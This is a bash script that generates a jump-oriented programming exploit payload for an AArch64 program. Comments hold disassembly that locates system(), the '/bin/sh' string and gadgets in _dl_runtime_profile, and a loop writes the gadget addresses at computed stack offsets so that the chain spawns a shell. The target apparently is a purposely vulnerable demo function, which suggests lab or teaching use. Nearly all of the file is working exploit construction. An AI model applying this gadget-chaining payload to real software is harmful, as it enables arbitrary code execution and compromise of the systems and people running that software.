#!/bin/bash 

##Get the system() api address and "/bin/sh" string address 
: << 'jop_symbol'
	system("/bin/ls");
  400404:	f0000260 	adrp	x0, 44f000 <_nl_locale_subfreeres+0x1b8>
  400408:	9116e000 	add	x0, x0, #0x5b8
  40040c:	940019bb 	bl	406af8 <__libc_system>

NOTE: libc_system = 0x406af8
jop_symbol
libc_system="\xf8\x6a\x40\x00\x00\x00\x00\x00"

##According to the glibc do_system source code
: << 'do_system'
      /* Exec the shell.  */
      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
      _exit (127);   

  406adc:	b0000240 	adrp	x0, 44f000 <_nl_locale_subfreeres+0x1b8>
  406ae0:	b900067f 	str	wzr, [x19, #4]
  406ae4:	91344000 	add	x0, x0, #0xd10
  406ae8:	9400435a 	bl	417850 <__execve>

NOTE: bash address = 0x44fd10
do_system
bash="\x10\xfd\x44\x00\x00\x00\x00\x00"

##Calling flow
#jop_bad_func --> _dl_runtime_profile --> _dl_runtime_profile --> system 
: << 'jop_bad_func'
Gadgets 1: Use this code to write the stack, u64's offset is 0x18 = 24, so data offset = sp - 24
	read(fd,&u64,512);
  400454:	910063a0 	add	x0, x29, #0x18
  400458:	d2804002 	mov	x2, #0x200                 	// #512
  40045c:	aa0003e1 	mov	x1, x0
  400460:	b94037a0 	ldr	w0, [x29, #52]
  400464:	94005edd 	bl	417fd8 <__libc_read>

Gadgets 2:Use stack to set the x0 = 0x441fc4 (Gadgets 4), data offset = (56 - 24)/8 = 4
	func();
  400468:	f9401fa0 	ldr	x0, [x29, #56]
  40046c:	d63f0000 	blr	x0
 
jop_bad_func

dl_g4="\x84\x1d\x44\x00\x00\x00\x00\x00"
dl_g4_offset=4

: << '_dl_runtime_profile'
Gadgets 4: 1. Set the X0 to the libc_system address, Gadgets 5 to set X16 = X0, offset = (48 - 24)/8 = 3
        2. Set the X30 to 0x441cf4 (Gadgets 5 address), offset = (232 - 24)/8 = 26
        3. *ldr     x29, [x29]* change X29 = X29 + 64 according to jop_bad_func, will use it at Gadgets 5
  441d84:	a94307a0 	ldp	x0, x1, [x29, #48]
  441d88:	6d4407a0 	ldp	d0, d1, [x29, #64]
  441d8c:	6d450fa2 	ldp	d2, d3, [x29, #80]
  441d90:	f94077be 	ldr	x30, [x29, #232]
  441d94:	910003bf 	mov	sp, x29
  441d98:	f94003bd 	ldr	x29, [x29]        
  441d9c:	910403ff 	add	sp, sp, #0x100
  441da0:	d61f03c0 	br	x30

Gadgets 5: 1. X16 = X0 to make the X16 = libc_system address 
        2. Set the X0 to /bin/sh, offset = ((96 + 64) - 24) /8 = 17
  441cf4:	aa0003f0 	mov	x16, x0
  441cf8:	a94607a0 	ldp	x0, x1, [x29, #96]
  441cfc:	a9470fa2 	ldp	x2, x3, [x29, #112]
  441d00:	a94817a4 	ldp	x4, x5, [x29, #128]
  441d04:	a9491fa6 	ldp	x6, x7, [x29, #144]
  441d08:	6d4a07a0 	ldp	d0, d1, [x29, #160]
  441d0c:	6d4b0fa2 	ldp	d2, d3, [x29, #176]
  441d10:	6d4c17a4 	ldp	d4, d5, [x29, #192]
  441d14:	6d4d1fa6 	ldp	d6, d7, [x29, #208]
  441d18:	a9407bbd 	ldp	x29, x30, [x29]
  441d1c:	910403ff 	add	sp, sp, #0x100
  441d20:	d61f0200 	br	x16
_dl_runtime_profile

libc_system_offset=3
bash_offset=17

dl_g5="\xf4\x1c\x44\x00\x00\x00\x00\x00"
dl_g5_offset=26

data=jop.data
printf "" > $data

for (( i=0; i < 40; ++i)); do 
	if [ $i -eq $dl_g4_offset ] ; then 
		printf "$dl_g4" >> $data
	elif [ $i -eq $dl_g5_offset ] ; then 
		printf "$dl_g5" >> $data
	elif [ $i -eq $libc_system_offset ] ; then 
		printf "$libc_system" >> $data
	elif [ $i -eq $bash_offset ] ; then 
		printf "$bash" >> $data
        else
		printf "\xff\xff\xff\xff\xff\xff\xff\xff" >> $data
	fi
done 
